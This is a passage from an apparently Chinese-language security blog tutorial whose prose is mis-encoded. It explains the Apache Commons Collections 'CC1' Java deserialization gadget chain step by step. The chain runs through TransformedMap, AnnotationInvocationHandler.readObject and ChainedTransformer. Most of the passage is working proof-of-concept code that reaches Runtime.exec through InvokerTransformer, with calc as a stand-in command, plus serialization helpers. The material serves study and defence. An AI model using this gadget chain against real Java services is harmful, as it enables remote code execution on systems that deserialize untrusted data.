class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>    &#125;<br></code></pre></td></tr></table></figure><p>ç„¶å<code>public</code>ä¿®é¥°çš„<code>decorate</code>å°±èƒ½ç›´æ¥<code>new</code>ä¸€ä¸ª<code>TransformedMap</code>å¯¹è±¡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br> &#125;<br></code></pre></td></tr></table></figure><p>æˆªæ­¢åˆ°ç›®å‰çš„æ€è·¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">TransformedMap.decorate -&gt; é€šè¿‡<span class="hljs-keyword">new</span>ä¸€ä¸ªå®ä¾‹<br>    è°ƒç”¨TransformedMapçš„æ„é€ æ–¹æ³• - &gt; ä»è€Œå®šä¹‰valueTransformer<br>    è°ƒç”¨TransformedMapçš„checksetValue -&gt;<br>    è°ƒç”¨valueTransformer.transform(value)<br><br>è¯´ç™½äº†å°±æ˜¯æ¢æ¡è·¯è°ƒç”¨transformæ–¹æ³•:<br>æœ¬æ¥æ˜¯invokerTransformer.transform(runtime)ï¼Œç°åœ¨æ˜¯ä»TransformedMap.javaä¸‹èµ°è¿‡å»<br></code></pre></td></tr></table></figure><p><code>EXP</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">decorateCalc</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);  <br> Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">checkSetValueMethod</span> <span class="hljs-operator">=</span> transformedMapClass.getDeclaredMethod(<span class="hljs-string">&quot;checkSetValue&quot;</span>, Object.class);  <br> checkSetValueMethod.setAccessible(<span class="hljs-literal">true</span>);  <br> checkSetValueMethod.invoke(decorateMap, runtime);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ª<code>checkSetValue</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//AbstractInputCheckedMapDecorator.java</span><br><span class="hljs-comment">//åŒæ—¶è¦æ³¨æ„è¿™ä¸œè¥¿æ˜¯TransformedMapçš„çˆ¶ç±»</span><br><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object value)</span> &#123;<br>            value = parent.checkSetValue(value);<br>            <span class="hljs-keyword">return</span> entry.setValue(value);<br>        &#125;<br><span class="hljs-comment">//å®é™…ä¸Šå°±æ˜¯åœ¨ Map ä¸­å¯¹ä¸€ç»„ entryï¼ˆé”®å€¼å¯¹ï¼‰è¿›è¡Œ setValue() æ“ä½œ</span><br></code></pre></td></tr></table></figure><p>å†å¾€ä¸Šè·Ÿï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//AbstractMapEntryDecorator.java</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">return</span> entry.setValue(object);<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>setValue()</code> <strong>å®é™…ä¸Šå°±æ˜¯åœ¨ Map ä¸­å¯¹ä¸€ç»„ entryï¼ˆé”®å€¼å¯¹ï¼‰</strong>è¿›è¡Œ <code>setValue()</code> æ“ä½œã€‚</p><p>è¿˜å¾€ä¸Šè·Ÿï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Map.java</span><br>V <span class="hljs-title function_">setValue</span><span class="hljs-params">(V value)</span>;<br></code></pre></td></tr></table></figure><p>å…ˆçœ‹ä¸‹<code>POC</code>æ€ä¹ˆå†™ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SetValueTest01</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> hashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);  <br> Map&lt;Object, Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);  <br> <span class="hljs-keyword">for</span> (Map.Entry entry:decorateMap.entrySet())&#123;  <br>            entry.setValue(runtime);  <br> &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>decorateMap.entrySet()</code> è¿”å›<code>decorateMap</code>ä¸­çš„æ‰€æœ‰é”®å€¼å¯¹çš„é›†åˆã€‚</li><li><code>Map.Entry</code> æ˜¯ä¸€ä¸ªè¡¨ç¤ºMapä¸­çš„é”®å€¼å¯¹çš„æ¥å£ã€‚</li><li><code>entry.setValue(runtime)</code> å°†æ¯ä¸ªé”®å€¼å¯¹çš„å€¼è®¾ç½®ä¸º<code>runtime</code>çš„å€¼ã€‚</li></ul><p>å…¶å®æ¯”è¾ƒå…³é”®çš„ä»£ç æ˜¯è¿™ä¸¤éƒ¨åˆ†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">hashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);  <span class="hljs-comment">//è¿™é‡Œå…ˆå¾€Mapé‡Œé¢æ”¾äº›å€¼</span><br><span class="hljs-keyword">for</span> (Map.Entry entry:decorateMap.entrySet())&#123;  <br>           entry.setValue(runtime);  <br>&#125;  <span class="hljs-comment">//éå†Mapè°ƒç”¨setValueæ–¹æ³•ï¼Œæ³¨æ„runtimeè¿™ä¸ªå‚æ•°ï¼š</span><br><span class="hljs-comment">//è¯´ç™½äº†è¿˜æ˜¯åœ¨ä¹‹å‰çš„åŸºç¡€ä¸Šè°ƒç”¨checksetValue(runtime)ï¼</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ç°åœ¨ç›®æ ‡å°±æ˜¯æ‰¾<code>readObject()</code> é‡Œé¢è°ƒç”¨äº† <code>setValue()</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//AnnotationInvocationHandler.javaçš„readObjectæ–¹æ³•å­˜åœ¨ï¼š</span><br><span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ‹¿äº†DBå¸ˆå‚…çš„å›¾ï¼š</p><p><img src="/img/cc1.png" alt="cc1"></p><p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬çš„ç›®çš„æ˜¯è¦è°ƒç”¨è¿™ä¸ªç±»ä¸‹çš„<code>readObject</code>æ–¹æ³•ï¼Œä½†æ³¨æ„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, Serializable<br></code></pre></td></tr></table></figure><p><code>Java</code>ä¸­ï¼Œå¦‚æœæ²¡æœ‰æ˜ç¡®æŒ‡å®šæƒé™ä¿®é¥°ç¬¦ï¼Œåˆ™é»˜è®¤ä½¿ç”¨çš„æ˜¯<code>default</code>ä¿®é¥°ç¬¦ã€‚ä½¿ç”¨<code>default</code>ä¿®é¥°ç¬¦ä¿®é¥°çš„ç±»å’Œæˆå‘˜å˜é‡ç­‰åªèƒ½åœ¨åŒä¸€ä¸ªåŒ…ä¸­è¢«è®¿é—®ï¼Œè€Œä¸èƒ½åœ¨å…¶ä»–åŒ…ä¸­è¢«è®¿é—®ã€‚æ‰€ä»¥å¾—é€šè¿‡åå°„è°ƒç”¨è¿™ä¸œè¥¿ã€‚</p><p>ç„¶åæ³¨æ„ä¼ å‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues)<br><span class="hljs-comment">//ç¬¬ä¸€ä¸ªæ”¾ä¸ªæ³¨è§£ç±»å‹ï¼Œç¬¬äºŒä¸ªæ”¾çš„æ˜¯æˆ‘ä»¬è¦éå†çš„transformedMap</span><br></code></pre></td></tr></table></figure><p>æ³¨è§£çš„è¯æ¯”å¦‚<code>@override</code>ï¼Œ<code>@Target</code>è¿™ç§</p><p>ç†æƒ³æƒ…å†µä¸‹çš„EXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// ç†æƒ³æƒ…å†µçš„ EXP</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformMapImagineEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> hashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);  <br> Map&lt;Object, Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> aihConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, decorateMap);  <br>  <br> <span class="hljs-comment">// åºåˆ—åŒ–ååºåˆ—åŒ–  </span><br> <span class="hljs-comment">//serialize(o);  </span><br> <span class="hljs-comment">//unserialize(&quot;ser.bin&quot;);  </span><br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶å®æ€è·¯å°±æ˜¯é€šè¿‡åå°„è°ƒç”¨<code>AnnotationInvocationHandler</code>çš„æ„é€ å‡½æ•°(å®ä¾‹åŒ–ä¸€ä¸ª)ç„¶ååºåˆ—åŒ–ååºåˆ—åŒ–è§¦å‘é‡å†™çš„<code>readObject</code>æ–¹æ³•è¿›è€Œè°ƒç”¨ä¸Šé¢è¯´çš„<code>setValue</code>æ–¹æ³•ã€‚</p><p>è¿™æ®µä»£ç è‚¯å®šæ˜¯æ²¡ç»“æœçš„ï¼Œéœ€è¦è§£å†³ä¸€äº›é—®é¢˜ï¼š</p><p>1.<code>Runtime</code>å¯¹è±¡ä¸å¯åºåˆ—åŒ–(æ²¡æœ‰<code>implements Serializable</code>)</p><p><img src="/img/CC102.png" alt="CC102"></p><p>è¿™ä¸œè¥¿å¾ˆå¥½è§£å†³ï¼šClasså¯¹è±¡æ˜¯å¯ä»¥åºåˆ—åŒ–çš„ï¼Œå…ˆå†™ä¸€æ®µåˆ©ç”¨åå°„å®ç°å¼¹è®¡ç®—å™¨çš„ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FinalEXP;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SolvedProblemRuntime</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);  <br> <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> (Runtime) method.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);  <br> run.invoke(runtime, <span class="hljs-string">&quot;calc&quot;</span>);  <br> &#125;  <br>&#125;<br><span class="hljs-comment">//æ³¨æ„getRuntimeæ–¹æ³•æ˜¯é™æ€æ–¹æ³•</span><br></code></pre></td></tr></table></figure><p>å°†è¿™ä¸ªåå°„çš„ <code>Runtime</code> æ”¹é€ ä¸ºä½¿ç”¨ <code>InvokerTransformer.transform()</code> è°ƒç”¨çš„æ–¹å¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SolvedProblemRuntime</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;   <br>        <br> <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br>        <span class="hljs-comment">//Class runtime = Runtime.class;</span><br>        <span class="hljs-comment">//ç›¸å½“äºï¼šMethod m1 = runtime.getDeclaredMethod(&quot;getRuntime&quot;);ï¼Œå…¶å®å°±æ˜¯é€šè¿‡åå°„æ‹¿åˆ°äº†getruntimeæ–¹æ³•ã€‚</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;).transform(getRuntimeMethod);<br>        <span class="hljs-comment">//ç›¸å½“äºï¼šRuntime run1 = (Runtime)m1.invoke(null,null);runtimeæ˜¯ä¸ªé™æ€æ–¹æ³•ä¸¤ä¸ªå‚æ•°ç½®ç©ºå°±è¡Œã€‚å…¶å®å°±æ˜¯è·å¾—äº†ä¸€ä¸ªruntimeçš„å®ä¾‹ã€‚</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br>        <span class="hljs-comment">//ç›¸å½“äºä¸‹é¢è¿™ä¸ªä¸œè¥¿ï¼š</span><br>        <span class="hljs-comment">//        Method m2 = runtime.getDeclaredMethod(&quot;exec&quot;, String.class);</span><br>        <span class="hljs-comment">//        m2.invoke(run1,&quot;calc&quot;);</span><br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå‘ç°æ¯ä¸ª<code>transform()</code>æ–¹æ³•çš„å‚æ•°éƒ½æ˜¯ä¸Šä¸€ä¸ªç»“æœï¼Œè¿™æ—¶å¯ä»¥åˆ©ç”¨<code>ChainedTransformer</code>ç±»ä¸‹çš„<code>transform</code>æ–¹æ³•è¿›è¡Œç®€å†™ã€‚æˆ‘ä»¬çœ‹ä¸‹è¿™ä¸ªä¸œè¥¿ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iTransformers = transformers;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>            object = iTransformers[i].transform(object);<br>        &#125;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br><span class="hljs-comment">//æ”¾ä¸ªTransformeræ•°ç»„ï¼Œç„¶åè°ƒç”¨å¯¹åº”transformæ–¹æ³•</span><br></code></pre></td></tr></table></figure><p>ç°åœ¨æ€ä¹ˆæŠŠè¿™ä¸ª<code>ChainedTransformer</code>å¥—è¿›å»å°±å¾ˆæ¸…æ™°äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChainedTransformerEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> chainedTransformer.transform(Runtime.class);  <br> &#125;  